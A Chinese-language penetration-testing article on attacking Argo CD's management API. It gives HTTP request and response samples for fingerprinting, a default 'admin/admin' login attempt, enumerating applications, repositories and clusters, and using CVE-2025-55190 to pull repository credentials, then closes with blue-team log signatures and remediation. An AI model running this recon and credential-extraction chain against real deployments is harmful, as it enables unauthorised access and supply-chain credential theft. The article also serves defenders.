---
title: "Argo CD管理面打点与API利用技术"
date: 2026-06-15T11:21:04+08:00
draft: false
weight: 55
description: "围绕Argo CD相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "GitOps", "Argo CD"]
---

# Argo CD管理面打点与API利用技术

`Argo CD` 是 Kubernetes GitOps 交付体系中的高价值管理面。它的风险不在于“一个普通控制台”，而在于它天然掌握着：

- Git / Helm 仓库连接信息
- Application、Project、Cluster 的映射关系
- 同步策略与部署状态
- Repo Server 与 Manifest 渲染链
- API Token、项目级 Token 与 JWT 会话
- 面向 UI、CLI、gRPC、gRPC-Web 的统一 API 面

一旦 Argo CD 被暴露到低信任网络、匿名访问存在缺口、Token 管理松散或版本落入已知高危范围，攻击者通常可以在打点阶段快速获得：

- 项目名、应用名、命名空间、集群名
- Git 仓库地址、Helm 仓地址、目标 revision
- 同步状态、健康状态、资源树与目标集群
- 当前账号或低权限 Token 的真实 RBAC 边界
- 某些历史漏洞中暴露的敏感 settings 与仓库凭据

本文只聚焦打点与利用侧，重点记录：

1. 如何识别 Argo CD Web 面与 API 面
2. 如何通过 `REST API`、`JWT` 与 `gRPC-Web` 建立攻击画像
3. 如何在低权限或项目级 Token 条件下判断真实收益
4. 如何识别 `/api/v1/settings`、`/api/v1/projects/{project}/detailed` 等高价值端点
5. 蓝队如何从反向代理日志与 Argo CD API 日志中识别这类打点

---

## 0. 攻击面概览

### 0.1 常见路径

首轮至少应枚举：

- `/`
- `/login`
- `/auth/login`
- `/api/version`
- `/api/v1/session`
- `/api/v1/session/userinfo`
- `/api/v1/settings`
- `/api/v1/applications`
- `/api/v1/projects`
- `/api/v1/projects/{project}`
- `/api/v1/projects/{project}/detailed`
- `/api/v1/repositories`
- `/api/v1/clusters`
- `/api/v1/account/can-i`
- `/grpc.health.v1.Health/Check`

如果环境通过代理暴露 `gRPC-Web`，还应额外关注：

- `content-type: application/grpc-web+proto`
- `grpc-web-root-path`

### 0.2 打点收益优先级

按“最快转化为真实攻击价值”的顺序，常见收益可排列为：

1. 识别 Argo CD、版本、认证风格与会话模型
2. 判断 `/api/v1/settings`、`/api/version`、`/api/v1/session` 等基础面
3. 枚举 applications、projects、repositories、clusters
4. 用低权限 Token 验证 `can-i` 与 Project API 的真实授权边界
5. 核查历史高危面：`/api/v1/settings`、`/api/v1/projects/{project}/detailed`

---

## 1. 第一轮打点：确认是否为 Argo CD

### 1.1 登录页识别

#### 请求示例

```http
GET /login HTTP/1.1
Host: argocd.target.example
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: argocd.token=deleted; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT
```

页面正文与静态资源中常见特征包括：

- `Argo CD`
- `login to Argo CD`
- `argocd-server`

如果 UI 做了反向代理或自定义品牌，Cookie、接口返回和后续 `/api/version` 往往仍能把它识别出来。

### 1.2 版本接口

#### 请求示例

```http
GET /api/version HTTP/1.1
Host: argocd.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "Version": "v2.14.10+3f1436b",
  "BuildDate": "2026-04-29T08:12:44Z",
  "GitCommit": "3f1436bbbc4c6c5d9f8f8a1234567890abcdef12",
  "GitTag": "v2.14.10",
  "GoVersion": "go1.22.4",
  "Platform": "linux/amd64"
}
```

这条响应的价值非常高，因为它直接给出了：

- 主版本与分支
- commit / tag
- 后续是否命中 2024 与 2025 年高危 API 面的版本范围

### 1.3 会话接口是否存在

Argo CD 官方安全文档明确说明，本地 `admin` 用户与其它本地账户会通过 `/api/v1/session` 完成用户名密码到 JWT 的交换。

#### 请求示例

```http
POST /api/v1/session HTTP/1.1
Host: argocd.target.example
Content-Type: application/json
Accept: application/json
Connection: close

{
  "username": "admin",
  "password": "admin"
}
```

#### 典型失败响应示例

```json
{
  "error": "Invalid username or password"
}
```

即使这里只得到失败响应，也说明：

- 本地用户名密码交换端点存在
- 认证模型为 JWT 会话
- 后续如果从别处拿到口令或 Token，可直接切回 API 利用路径

---

## 2. 第二轮打点：settings、session 与账号边界

### 2.1 `/api/v1/settings`

这是 Argo CD 打点中极其关键的端点。公开漏洞资料表明，2024 年存在 `CVE-2024-37152`，允许未认证访问暴露部分敏感 setting。即使没有命中漏洞，settings 端点本身也值得单独探测，因为它会暴露：

- 认证模式
- URL 配置
- UI 特性
- SSO / Dex / OIDC 线索

#### 请求示例

```http
GET /api/v1/settings HTTP/1.1
Host: argocd.target.example
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "url": "https://argocd.target.example",
  "dexConfig": "",
  "oidcConfig": null,
  "anonymousUserEnabled": false,
  "statusBadgeEnabled": true,
  "users": [],
  "help": {
    "chatUrl": "",
    "chatText": ""
  },
  "passwordPattern": "^(?=.*[A-Z]).{12,}$"
}
```

对打点来说，这类响应会直接暴露：

- 认证方式
- 是否启用匿名用户
- 是否存在 passwordPattern 这类敏感策略信息

#### 典型失败响应示例

```json
{
  "error": "permission denied"
}
```

如果返回 `permission denied`，同样能说明：

- settings 端点存在
- 但当前版本或当前权限未直接开放

### 2.2 登录后获取 JWT

如果从别处拿到了有效本地用户口令或 OIDC 交换后的会话，下一步应立即记录会话响应。

#### 请求示例

```http
POST /api/v1/session HTTP/1.1
Host: argocd.target.example
Content-Type: application/json
Accept: application/json
Connection: close

{
  "username": "readonly-user",
  "password": "ReadOnlyPass!123"
}
```

#### 典型成功响应示例

```json
{
  "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IkJ1aWx0SW4ifQ.eyJpc3MiOiJhcmdvY2QiLCJzdWIiOiJyZWFkb25seS11c2VyIiwiaWF0IjoxNzE4MjM5OTAwLCJuYmYiOjE3MTgyMzk5MDB9.signature"
}
```

这条响应的价值包括：

- 说明 API 认证已建立
- 之后所有请求都可以切到 `Authorization: Bearer`
- 可以开始验证 Token 实际能读取哪些对象

### 2.3 `/api/v1/session/userinfo`

#### 请求示例

```http
GET /api/v1/session/userinfo HTTP/1.1
Host: argocd.target.example
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "iss": "argocd",
  "sub": "readonly-user",
  "groups": [
    "argocd-readonly",
    "devops"
  ],
  "name": "readonly-user",
  "email": "readonly-user@corp.local"
}
```

这类响应有助于明确：

- 当前 Token 绑定的 subject
- groups 信息
- 是否是本地用户、SSO 用户或项目级自动化身份

---

## 3. 第三轮打点：applications、projects、repositories、clusters

### 3.1 枚举 Applications

Argo CD 的核心资产是 Application。它们会直接暴露：

- 项目名
- 目标集群
- 目标 namespace
- source repoURL
- revision
- path / chart

#### 请求示例

```http
GET /api/v1/applications HTTP/1.1
Host: argocd.target.example
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "items": [
    {
      "metadata": {
        "name": "payment-api",
        "namespace": "argocd"
      },
      "spec": {
        "project": "production",
        "source": {
          "repoURL": "https://gitlab.internal.local/platform/payment-api.git",
          "path": "deploy/overlays/prod",
          "targetRevision": "main"
        },
        "destination": {
          "server": "https://kubernetes.default.svc",
          "namespace": "payment-prod"
        }
      },
      "status": {
        "health": {
          "status": "Healthy"
        },
        "sync": {
          "status": "Synced"
        }
      }
    }
  ]
}
```

这类响应的打点价值非常高，因为它一次性暴露：

- Git 仓库地址
- 部署路径
- 环境命名
- 目标 namespace
- 当前是否 healthy / synced

### 3.2 单个 Application 查询

#### 请求示例

```http
GET /api/v1/applications/payment-api HTTP/1.1
Host: argocd.target.example
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "metadata": {
    "name": "payment-api"
  },
  "spec": {
    "project": "production",
    "source": {
      "repoURL": "https://gitlab.internal.local/platform/payment-api.git",
      "path": "deploy/overlays/prod",
      "targetRevision": "main"
    }
  }
}
```

这一步更适合对高价值应用做精确回收和后续记录。

### 3.3 枚举 Projects

#### 请求示例

```http
GET /api/v1/projects HTTP/1.1
Host: argocd.target.example
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "items": [
    {
      "metadata": {
        "name": "production"
      },
      "spec": {
        "sourceRepos": [
          "https://gitlab.internal.local/platform/*"
        ],
        "destinations": [
          {
            "server": "https://kubernetes.default.svc",
            "namespace": "payment-prod"
          }
        ]
      }
    }
  ]
}
```

这类响应帮助你理解：

- Project 的 Git 仓范围
- 允许部署到哪些 namespace / cluster
- 当前 Token 是否具备 project 读取能力

### 3.4 枚举 Repositories

#### 请求示例

```http
GET /api/v1/repositories HTTP/1.1
Host: argocd.target.example
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "items": [
    {
      "repo": "https://gitlab.internal.local/platform/payment-api.git",
      "type": "git",
      "name": "payment-api"
    },
    {
      "repo": "https://charts.internal.local/helm",
      "type": "helm",
      "name": "corp-helm"
    }
  ]
}
```

这一步对打点尤其关键，因为：

- Git / Helm 仓库地址是最直接的供应链线索
- 后续仓库访问、Helm 凭据面或 2025 年 Project API 凭据泄露问题都与它强相关

### 3.5 枚举 Clusters

#### 请求示例

```http
GET /api/v1/clusters HTTP/1.1
Host: argocd.target.example
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "items": [
    {
      "server": "https://kubernetes.default.svc",
      "name": "in-cluster",
      "connectionState": {
        "status": "Successful"
      }
    }
  ]
}
```

即使没有 kubeconfig 明文，这类响应也足以帮助你判断：

- Argo CD 连接了哪些集群
- 哪些集群当前在线
- 哪些 app 与哪些 cluster 对应

---

## 4. 第四轮打点：RBAC 边界、project 详细信息与凭据泄露面

### 4.1 `can-i` 探测

Argo CD 在低权限 Token 打点里最有价值的动作之一，是先确认权限边界，而不是直接撞高敏接口。

#### 请求示例

```http
GET /api/v1/account/can-i?action=get&resource=projects&subresource=production HTTP/1.1
Host: argocd.target.example
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "value": "yes"
}
```

#### 典型失败响应示例

```json
{
  "value": "no"
}
```

这类响应可以直接帮助你决定：

- 是继续读 project 详情
- 还是转向 application / logs / repository 等其它面

### 4.2 `/api/v1/projects/{project}/detailed`

2025 年官方安全通告明确指出，`CVE-2025-55190` 会导致带有 project get 权限的低权限 Token 从该端点直接拿到 repository 凭据。

#### 请求示例

```http
GET /api/v1/projects/production/detailed HTTP/1.1
Host: argocd.target.example
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "project": {
    "metadata": {
      "name": "production"
    }
  },
  "repositories": [
    {
      "name": "corp-helm",
      "type": "helm",
      "project": "production",
      "url": "https://charts.internal.local/helm",
      "username": "helm-reader",
      "password": "HelmReadOnlyPass!"
    }
  ]
}
```

这条响应一旦出现，风险已经不再只是“信息泄露”，而是直接升级为：

- 仓库凭据暴露
- 供应链凭据回收
- 进一步接管 Helm / Git 仓或扩大到其他环境

#### 典型失败响应示例

```json
{
  "error": "permission denied"
}
```

即使失败，也说明：

- 端点存在
- 目标版本和权限模型值得继续验证

### 4.3 为什么 project-level token 很危险

公开安全通告和复现资料都强调：

- 攻击者不一定需要 admin token
- 只要拿到项目级自动化 token
- 就可能继续扩大成仓库凭据泄露

因此在打点阶段，只要从别处拿到：

- CI 变量
- `argocd` CLI 配置
- 自动化脚本中的 project token

就应优先验证 `/projects/{project}/detailed` 的实际返回。

---

## 5. 第五轮打点：gRPC / gRPC-Web 与日志接口

### 5.1 Argo CD 的 API 实际上建立在 gRPC 上

官方与社区资料都说明，Argo CD 的 REST 接口是基于 gRPC gateway 生成的，CLI 则原生使用 gRPC 或 gRPC-Web。这意味着：

- REST 只是其中一层访问方式
- 某些代理与入口会限制普通 gRPC，但允许 gRPC-Web
- 某些高频交互场景可以直接从 gRPC 服务面确认能力边界

### 5.2 gRPC 服务探测

在授权测试环境中，如果目标直暴露 gRPC，可使用 `grpcurl` 做服务枚举。

#### 请求示例

```bash
grpcurl -insecure argocd.target.example:443 list
```

#### 典型响应示例

```text
application.ApplicationService
cluster.ClusterService
project.ProjectService
repository.RepositoryService
session.SessionService
settings.SettingsService
```

这类响应的价值包括：

- 明确后端服务面
- 为后续选择 REST 还是 gRPC-Web 提供依据

### 5.3 gRPC-Web 场景

如果前端代理不支持 HTTP/2，Argo CD CLI 常会切换到 `--grpc-web`。从打点角度看，这意味着：

- 某些看起来像普通 POST 的流量实际是 gRPC-Web
- 单纯按 REST 习惯看路径可能会漏掉服务语义

### 5.4 应用日志接口

Argo CD CLI 官方文档说明 `argocd app logs` 会通过 API 服务获取应用相关 Pod 日志。这意味着只要某个低权限 Token 具备相应能力，就不只是看到应用元数据，还可能继续看到运行期日志。

#### 请求示例

```bash
argocd app logs payment-api --grpc-web --auth-token "$ARGOCD_TOKEN"
```

#### 典型响应示例

```text
2026-06-13T02:51:11Z INFO Starting payment-api
2026-06-13T02:51:12Z INFO Loaded profile prod
2026-06-13T02:51:14Z ERROR Redis connection failed: redis://10.10.41.12:6379
```

对打点来说，这种能力的价值包括：

- 继续回收运行期配置线索
- 回收内部地址
- 判断日志接口是否应进入高优先级权限审计

---

## 6. 打点流程建议

更稳的 Argo CD 打点流程通常如下：

### 6.1 第一轮：识别与版本

优先请求：

- `/login`
- `/api/version`
- `/api/v1/settings`
- `/api/v1/session`

目标：

- 确认产品与版本
- 确认认证模型
- 判断 settings 端点是否异常开放

### 6.2 第二轮：会话与身份

优先请求：

- `/api/v1/session`
- `/api/v1/session/userinfo`
- `/api/v1/account/can-i`

目标：

- 建立 JWT 会话
- 确认 subject / groups
- 确认真实权限边界

### 6.3 第三轮：核心对象枚举

优先请求：

- `/api/v1/applications`
- `/api/v1/projects`
- `/api/v1/repositories`
- `/api/v1/clusters`

目标：

- 还原 app / project / repo / cluster 关系
- 建立完整部署画像

### 6.4 第四轮：高危 Project API

优先请求：

- `/api/v1/projects/{project}/detailed`

目标：

- 判断是否命中 2025 凭据泄露面
- 评估 project token 的真实风险

### 6.5 第五轮：gRPC 与日志面

优先请求：

- `grpcurl list`
- CLI `--grpc-web`
- app logs / watch / streaming 相关接口

目标：

- 判断后端服务面
- 判断是否还存在日志、watch、streaming 级别的附加收益

---

## 7. 蓝队检测与处置

### 7.1 访问日志中的高价值信号

应重点识别：

- 对 `/api/version`、`/api/v1/settings`、`/api/v1/session` 的探测
- 对 `/api/v1/applications`、`/api/v1/projects`、`/api/v1/repositories` 的批量读取
- 对 `/api/v1/account/can-i` 的 RBAC 探测
- 对 `/api/v1/projects/{project}/detailed` 的访问
- `grpc-web` 或 CLI 风格的大量 API 请求

#### 日志示例

```text
10.10.10.21 - - [13/Jun/2026:03:11:11 +0800] "GET /api/version HTTP/1.1" 200 188 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [13/Jun/2026:03:11:16 +0800] "GET /api/v1/applications HTTP/1.1" 200 3211 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [13/Jun/2026:03:11:24 +0800] "GET /api/v1/projects/production/detailed HTTP/1.1" 200 871 "-" "python-requests/2.32"
```

第三条通常应被视为高优先级告警，因为它可能直接关联仓库凭据泄露。

### 7.2 Argo CD API 日志中的调查点

官方安全文档明确说明，Argo CD 会记录大部分 API 请求的 payload，但敏感接口如 session 创建等会做保护。这意味着日志本身非常适合用来还原打点链。

常见调查点包括：

- 应用和项目列表请求
- repository 与 cluster 请求
- `can-i` 权限探测
- project detail 访问

#### 日志示例

```text
time="2026-06-13T03:11:16Z" level=info msg="finished unary call with code OK" grpc.method=List grpc.service=application.ApplicationService grpc.start_time="2026-06-13T03:11:16Z" span.kind=server system=grpc
```

```text
time="2026-06-13T03:11:24Z" level=info msg="finished unary call with code OK" grpc.method=GetDetailedProject grpc.service=project.ProjectService grpc.start_time="2026-06-13T03:11:24Z" span.kind=server system=grpc
```

如果环境启用了反向代理访问日志，再把 `URI` 与 `grpc.method` 对上，通常足以非常快地确认攻击阶段。

### 7.3 处置建议

发现 Argo CD 正在被打点后，应优先做：

1. 立即检查 `/api/v1/settings` 是否异常对外开放
2. 审核所有 project token、automation token 和长期有效 JWT
3. 审核 `/api/v1/projects/{project}/detailed` 的访问记录
4. 检查 repositories、clusters、applications 是否已被低权限身份批量读取
5. 复核版本是否落入 `CVE-2024-37152` 与 `CVE-2025-55190` 范围
6. 检查是否已有 repository 凭据泄露并完成轮换

长期建议：

- 不把 argocd-server 暴露给低信任网络
- 最小化 project token 权限与生命周期
- 对 project detail、settings、repositories、clusters 建立单独审计
- 为 gRPC-Web 和 CLI 风格请求建立行为规则
- 及时升级到已修复版本

---

## 8. 复盘清单

### 8.1 红队侧

- 是否确认了版本与 settings / session 端点
- 是否拿到了 JWT 并验证了 groups / subject
- 是否回收了 applications、projects、repositories、clusters
- 是否验证了 `can-i` 与 `/projects/{project}/detailed`
- 是否测试了 gRPC / gRPC-Web 与日志接口面

### 8.2 蓝队侧

- 是否能识别从 version/settings 到 project detail 的连续打点
- 是否能识别 `can-i` 这类 RBAC 探测
- 是否能识别 project token 的异常 API 使用
- 是否能从 API 日志中还原 gRPC method 与对象访问链

### 8.3 应急侧

- 是否确认 repository 凭据是否已被读取
- 是否确认 project token 是否已泄露或滥用
- 是否完成敏感 API 的访问范围收敛
- 是否完成受影响版本升级与凭据轮换

---

## 9. 总结

`Argo CD` 的风险不只是“一个 GitOps 控制台可访问”，而是它经常在同一套 API 面上同时暴露：

- 应用
- 项目
- 仓库
- 集群
- JWT 与项目级 token
- gRPC / gRPC-Web 服务面

对打点来说，更值得沉淀的方法学是：

- 先识别版本与 settings/session
- 再确认身份和 RBAC 边界
- 再枚举 applications、projects、repositories、clusters
- 最后验证 project detail、gRPC 与日志接口面的实际收益

这样才能把“GitOps 平台暴露”真正转化成结构化的攻击价值判断。

---

## 参考资料

- [Argo CD Security](https://argo-cd.readthedocs.io/en/stable/operator-manual/security/)
- [Argo CD Unauthenticated Access to sensitive setting](https://pentest-tools.com/vulnerabilities-exploits/argo-cd-unauthenticated-access-to-sensitive-setting_22915)
- [Project API Token Exposes Repository Credentials](https://github.com/argoproj/argo-cd/security/advisories/GHSA-786q-9hcg-v9ff)
- [How to Use ArgoCD gRPC API](https://oneuptime.com/blog/post/2026-02-26-argocd-grpc-api/view)
- [argocd app logs Command Reference](https://argo-cd.readthedocs.io/en/stable/user-guide/commands/argocd_app_logs/)
